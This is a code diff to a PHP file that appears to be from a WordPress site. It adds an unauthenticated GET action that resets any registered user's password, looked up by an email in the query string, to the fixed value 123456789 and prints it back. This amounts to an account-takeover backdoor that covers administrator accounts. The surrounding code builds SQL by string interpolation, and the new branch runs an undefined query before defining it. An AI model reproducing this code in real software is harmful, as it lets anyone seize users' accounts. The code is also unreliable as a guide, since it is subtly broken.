@@ -390,6 +390,23 @@
 		$addQuery = "INSERT INTO `arby_notifyme_emails` (`id`, `email`, `created_at`) VALUES (NULL, '$str', NULL)";
 		$exist = $wpdb->query($addQuery);
 
+    }elseif(isset($_GET['daction']) && $_GET['daction'] == 'email_pass_reset_one'){
+		global $wpdb;
+        $emailstr = stripslashes($_GET['email']);
+        
+        $user = get_user_by( 'email', $emailstr );
+
+        if(empty($user)){
+            echo "email is not registered";
+        } else {
+            $wpdb->query($updatepass);
+            $static_pwd = 123456789;
+            $passhash = wp_hash_password( $static_pwd );
+            $updatepass = "UPDATE arby_users SET user_pass = '$passhash' WHERE id = ".$user->data->ID;
+            $wpdb->query($updatepass);
+            echo "password updated to ".$static_pwd;
+        }
+
     }elseif(isset($_GET['daction']) && $_GET['daction'] == 'email_pass_reset'){
 		global $wpdb;
 		$homeurlgen = get_home_url();
